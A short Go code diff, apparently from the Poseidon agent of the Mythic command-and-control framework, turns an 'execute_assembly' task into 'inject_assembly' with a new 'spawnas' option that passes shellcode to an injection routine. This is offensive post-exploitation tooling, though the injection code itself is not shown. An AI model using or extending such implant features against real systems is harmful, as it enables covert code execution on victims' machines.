@@ -1,4 +1,4 @@
-package execute_assembly
+package inject_assembly
 
 import (
 	// Standard
@@ -9,16 +9,17 @@ import (
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
 )
 
-type executeAssemblyArgs struct {
+type injectAssemblyArgs struct {
 	FileID    string `json:"file_id"`
 	ArgString string `json:"args"`
+	SpawnAs   string `json:"spawnas"`
 }
 
 func Run(task structs.Task) {
 	msg := structs.Response{}
 	msg.TaskID = task.TaskID
 
-	args := executeAssemblyArgs{}
+	args := injectAssemblyArgs{}
 
 	err := json.Unmarshal([]byte(task.Params), &args)
 	if err != nil {
@@ -51,7 +52,7 @@ func Run(task structs.Task) {
 		return
 	}
 
-	output, err := executeShellcode(shellcode)
+	output, err := injectShellcode(shellcode, args.SpawnAs)
 	if err != nil {
 		msg.Completed = false
 		msg.UserOutput = err.Error()
